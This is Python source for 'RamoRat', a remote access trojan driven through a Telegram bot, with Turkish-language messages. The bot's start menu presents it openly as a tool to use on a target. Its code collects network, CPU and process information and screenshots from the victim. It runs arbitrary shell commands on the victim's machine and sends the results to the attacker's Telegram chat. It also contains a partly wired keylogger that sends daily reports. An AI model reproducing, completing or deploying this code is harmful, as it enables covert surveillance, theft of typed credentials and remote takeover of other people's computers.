#Coded By Ramo 
#Github RamoDigitalMaestro

import subprocess
import pyautogui
import os
import telebot
from datetime import datetime, timedelta
import time

TOKEN = "your_token"
chat_id = "your_chatid"

bot = telebot.TeleBot(TOKEN)

@bot.message_handler(commands=["start"])
def start(message):
    response = "👋 <b>Merhaba RamoRat V 1.0'a hoşgeldiniz!</b>\n\n"
    response += "Hedef dosyayı başlattıysa aşağıdaki komutları kullanabilirsiniz:\n\n"
    response += "<b>Kullanılabilir Komutlar:</b>\n"
    response += "1⃣ /ipbilgileri - İp bilgilerini alır.\n"
    response += "2⃣ /cpubilgisi - CPU bilgilerini gösterir.\n"
    response += "3⃣ /screenshotal - Ekran görüntüsü alır.\n"
    response += "4⃣ /islembilgileri - Sistemde çalışan tüm işlemleri görüntüler.\n"
    response += "5⃣ /agtarama - Hedefin ağındaki cihazların IP ve MAC adresini görüntüler.\n"
    response += "6⃣ /komut - Hedefin cihazında istediğin komutu çalıştırır.\n"
    response += "7⃣ /keylog Klavyeyi dinler ve hergün belirli saatlerde raporu gönderir.\n"
    response += "Komutları kullanmak için istediğiniz komutu seçin."
    
    bot.reply_to(message, response, parse_mode="HTML")

def ip_linux():
    ip_info = subprocess.run(["ifconfig"], stdout=subprocess.PIPE, text=True)
    with open("ipbilgileri.txt", "w") as dosya:
        dosya.write(ip_info.stdout)
    file_path = os.path.realpath("ipbilgileri.txt")
    msj = "İp Bilgileri 📡 : "
    bot.send_document(chat_id, open(file_path, "rb"), caption=msj)

def cpu_linux():
    cpu_info = subprocess.run(["lscpu"], stdout=subprocess.PIPE, text=True)
    with open("cpubilgileri.txt", "w") as dosya:
        dosya.write(cpu_info.stdout)
    file_path = os.path.realpath("cpubilgileri.txt")
    msj = "Cpu Bilgileri 💽 : "
    bot.send_document(chat_id, open(file_path, "rb"), caption=msj)
    
    
def ps_linux():
    islem_info = subprocess.run(["ps"], stdout=subprocess.PIPE, text=True)
    with open("islembilgileri.txt", "w") as dosya:
        dosya.write(islem_info.stdout)
    file_path = os.path.realpath("islembilgileri.txt")
    msj = "İşlem Bilgileri  : "
    bot.send_document(chat_id, open(file_path, "rb"), caption=msj)

def ip_windows():
    ip_info = subprocess.run(["ipconfig"], stdout=subprocess.PIPE, text=True)
    with open("ipbilgileri.txt", "w") as dosya:
        dosya.write(ip_info.stdout)
    file_path = os.path.realpath("ipbilgileri.txt")
    msj = "İp Bilgileri 📡 : "
    bot.send_document(chat_id, open(file_path, "rb"), caption=msj)

def cpu_windows():
    cpu_info = subprocess.run(["wmic", "cpu", "get", "caption", "deviceid", "name", "numberofcores", "maxclockspeed"], stdout=subprocess.PIPE, text=True)
    with open("cpubilgileri.txt", "w") as dosya:
        dosya.write(cpu_info.stdout)
    file_path = os.path.realpath("cpubilgileri.txt")
    msj = "Cpu Bilgileri 💿 : "
    bot.send_document(chat_id, open(file_path, "rb"), caption=msj)
    
    
def ps_windows():
    islem_info = subprocess.run(["Get-Process"], stdout=subprocess.PIPE, text=True)
    with open("islembilgileri.txt", "w") as dosya:
        dosya.write(islem_info.stdout)
    file_path = os.path.realpath("islembilgileri.txt")
    msj = "İşlem Bilgileri  : "
    bot.send_document(chat_id, open(file_path, "rb"), caption=msj)

def route():
    ag_info = subprocess.run(["arp", "-a"], stdout=subprocess.PIPE, text=True)
    with open("agbilgileri.txt", "w") as dosya:
        dosya.write(ag_info.stdout)
    file_path = os.path.realpath("agbilgileri.txt")
    msj = "Ağ Bilgileri  : "
    bot.send_document(chat_id, open(file_path, "rb"), caption=msj)

def screenshot():
    screenshot = pyautogui.screenshot()
    screenshot_path = "screenshot.png"
    screenshot.save(screenshot_path)
    msj = "ScreenShot 📷 : "
    bot.send_photo(chat_id, open(screenshot_path, 'rb'), caption=msj)

def komut(message):
    komut = message.text.split(' ', 1)[-1]
    if komut.startswith("cd "):
        yeni_dizin = komut.split(' ', 1)[-1] 
        try:
            os.chdir(yeni_dizin)
            bot.reply_to(message, f"Dizin değiştirildi: {yeni_dizin}")
        except FileNotFoundError:
            bot.reply_to(message, "Belirtilen dizin bulunamadı.")
        except PermissionError:
            bot.reply_to(message, "İzin yok: Yeni dizine geçilemiyor.")
    else:
        çıktı = subprocess.run(komut, shell=True, capture_output=True, text=True)
        if çıktı.stdout:
            bot.reply_to(message, çıktı.stdout)
        elif çıktı.stderr:
            bot.reply_to(message, çıktı.stderr)
        else:
            bot.reply_to(message, "Komut başarıyla çalıştırıldı.")

def log_key(key):
    with open("keylog.txt", "a") as f:
        f.write(f"{key} ")

def send_keylog():
    try:
        with open("keylog.txt", "rb") as file:
            bot.send_document(chat_id, file, caption="Günlük Keylogger Raporu")
            open("keylog.txt", "w").close()
    except Exception as e:
        print(f"Hata: {e}")

def keylogger_start():
    while True:
        now = datetime.now()
        send_time = now.replace(hour=23, minute=59, second=0, microsecond=0)
        if now >= send_time:
            send_keylog()
            send_time += timedelta(days=1)
        delta = send_time - now
        seconds_to_sleep = delta.total_seconds()
        time.sleep(seconds_to_sleep)

sistem_info = os.name 

@bot.message_handler(commands=["ipbilgileri"])
def ag_bilgileri(message):
    if sistem_info == "posix":
        ip_linux()
    else:
        ip_windows()

@bot.message_handler(commands=["cpubilgisi"])
def cpu_bilgileri(message):
    if sistem_info == "posix":
        cpu_linux()
    else:
        cpu_windows()

@bot.message_handler(commands=["screenshotal"])
def screenshot_al(message):
    screenshot()

@bot.message_handler(commands=["islembilgileri"])
def islem(message):
    if sistem_info == "posix":
        ps_linux()
    else:
        ps_windows()

@bot.message_handler(commands=["agtarama"])
def agtarama(message):
    route()

@bot.message_handler(commands=['komut'])
def komut_start(message):
    komut(message)

@bot.message_handler(commands=['keylog'])
def keylogger_command(message):
    keylogger_start()

bot.polling()

